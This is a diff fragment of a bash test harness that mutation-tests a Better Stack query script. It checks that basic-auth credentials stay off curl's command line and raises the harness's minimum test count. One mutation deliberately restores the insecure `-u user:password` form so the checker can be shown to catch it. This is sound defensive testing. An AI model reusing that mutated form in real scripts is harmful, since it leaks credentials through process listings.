+else row "mutation: a refusal that exits 1 (the reader-exit-1 class that blames DOPPLER_TOKEN) turns the refusal row RED on the exit code alone" fail "checks:$BS_BAD"; fi
+bs_mut argvback '--config - < <(printf '"'"'user = "%s:%s"\n'"'"' "$BETTERSTACK_QUERY_USERNAME" "$BETTERSTACK_QUERY_PASSWORD")' '-u "${BETTERSTACK_QUERY_USERNAME}:${BETTERSTACK_QUERY_PASSWORD}"'
+bs_run bsm-argvback "$BS_USER" "$BS_PASS"; bs_ok_call bsm-argvback
+if [[ " $BS_BAD " == *" user-flag-in-argv "* && " $BS_BAD " == *" user-token-in-argv "* && " $BS_BAD " == *" value-in-argv "* ]]; then
+  row "mutation: the pair put back on curl's argv (-u) turns the well-formed row RED on the user flag and on both values in argv" ok
+else row "mutation: the pair put back on curl's argv (-u) turns the well-formed row RED on the user flag and on both values in argv" fail "checks:$BS_BAD"; fi
+BS_SCRIPT="$REPO_ROOT/$BSQ"
+echo "=== stage S2-B: Better Stack reader (basic auth off argv) done ==="
+
+# =====================================================================================
 # VERDICT. The floor and the conservation check are reported with printf + exit 1, never
 # through the helpers they guard. Rows only grow as probes convert, so the floor is a LOWER bound.
 # =====================================================================================
@@ -1907,7 +2253,7 @@ check_conservation "$pass" "$fail" "$CASES" || exit 1
 
 # BOTH operands are literals on the lines IMMEDIATELY above the `if`.
 SELFTEST_PASSES=0
-EXPECTED_TESTS=247
+EXPECTED_TESTS=284
 REAL=$((pass + fail - SELFTEST_PASSES))
 if [[ "$REAL" -lt "$EXPECTED_TESTS" ]]; then
   printf 'ANTI-VACUITY FLOOR: only %s rows ran, floor is %s -- rows were skipped, truncated, or the assertion machinery was neutered.\n' "$REAL" "$EXPECTED_TESTS" >&2
